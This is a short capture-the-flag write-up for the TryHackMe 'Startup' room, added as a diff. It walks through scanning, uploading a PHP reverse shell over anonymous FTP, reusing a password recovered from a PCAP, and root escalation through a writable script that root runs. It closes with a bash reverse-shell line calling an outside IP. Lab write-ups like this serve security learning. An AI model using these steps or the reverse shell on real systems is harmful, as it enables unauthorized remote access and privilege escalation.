@@ -1,0 +1,53 @@
+```
+  CTF : https://tryhackme.com/room/startup
+  Style: Unguided
+  Difficulty : Easy / Beginner
+```
+
+Looks like a simple website.
+
+To get started, lets run NMAP and GOBUSTER
+
+  GOBuster got a hit : http://10.10.105.59/files/notice.txt
+
+```
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+```
+name "Maya" is mentioned
+
+
+** NMAP
+  Shows FTP Server. We should try to connect to that.
+
+
+I can Anonymous login to the FTP, lets see if we can upload it.
+
+Uploaded a Reverse shell PHP with FTP, executed it and now logged in as www-data
+
+
+I find recipe.txt on the "/" giving me the secret ingredient.
+```
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+```
+
+
+I found the Suspicious PCAP file and by using "Follow TCP stream" i found it was using a reverse shell to login;''
+It was using this password for an attempt to login as lennie, lets see if it works
+```
+c4ntg3t3n0ughsp1c3
+```
+Instead of upgrading my Reverse shell, i opted to just SSH into the machine
+
+``
+lennie@<ip>
+``
+
+I notice that in the `/home/lennie/scripts` folder there is some .sh file owned by root who calls /etc/print.sh (for no reason).
+
+/etc/print.sh is owned by lennie, so that allows me to make adjustments and they will be run BY root. (So as root), here i make a reverse shell with TCP with bash
+```
+#!/bin/bash
+/bin/bash -l > /dev/tcp/10.14.12.121/4444 0<&1 2>&1
+echo "Done!"
+```
